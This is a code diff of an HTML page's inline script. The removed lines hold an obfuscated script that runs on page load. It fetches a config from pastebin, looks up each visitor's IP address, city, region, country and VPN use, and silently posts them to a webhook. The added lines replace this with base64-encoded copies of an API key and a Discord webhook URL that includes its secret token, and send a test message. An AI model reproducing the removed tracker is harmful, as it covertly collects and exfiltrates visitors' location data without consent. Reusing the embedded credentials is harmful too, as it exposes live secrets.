@@ -7,32 +7,30 @@
 </head>
 <body>
     <script>
-        const a1B2c3D4E5 = 'https://pastebin.com/raw/quyru4jf';
+        // Base64 encoded values
+        const apiKeyBase64 = 'NDEyMjk4ZDY0ZTRmNGZiZmJiOGVlOTA1ZGEyMGVjY2E=';
+        const webhookUrlBase64 = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI4MDk0MTc1MTYyNDAwNzcyMC9zdHdkTFc4RDg2NkhQVkRaUEFHNVhvWURpNmZBOTFqZldQYWFTNm5tVGNzYjI4UVU2dGRQSkVCVnVUT19SUDV0UWdROQ==';
 
-        async function jK8l9MnOpQ() {
-            const zXyWvU = await fetch(a1B2c3D4E5);
-            const tGhJ6K9 = await zXyWvU.text();
-            const sR8T9Y0 = atob(tGhJ6K9);
-            const [uY5X6Z7A8, bC3D4E5F6] = sR8T9Y0.split(',');
-            xF2G3H4I5(uY5X6Z7A8, bC3D4E5F6);
+        // Function to decode Base64 strings
+        function decodeBase64(encoded) {
+            return atob(encoded);
         }
 
-        async function xF2G3H4I5(a, b) {
-            const mN1O2P3 = await fetch(`https://vpnapi.io/api/auto?key=${a}`);
-            const qR4S5T6 = await mN1O2P3.json();
-            const lM7N8O9 = qR4S5T6.location.city || "Unknown";
-            const pQ0R1S2 = qR4S5T6.location.region || "Unknown";
-            const vW3X4Y5 = qR4S5T6.location.country || "Unknown";
-            const tU6V7W8 = qR4S5T6.security.vpn ? "Yes" : "No";
-            const oP9Q0R1 = {
-                content: `Data: ${qR4S5T6.ip}\nPlace: ${lM7N8O9}, ${pQ0R1S2}, ${vW3X4Y5}\nVPN: ${tU6V7W8}`
+        async function jK8l9MnOpQ() {
+            // Decode the Base64 values
+            const apiKey = decodeBase64(apiKeyBase64);
+            const webhookUrl = decodeBase64(webhookUrlBase64);
+
+            const messagePayload = {
+                content: "Hello, this is a test message!"
             };
-            await fetch(b, {
+
+            await fetch(webhookUrl, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify(oP9Q0R1)
+                body: JSON.stringify(messagePayload)
             });
         }
 
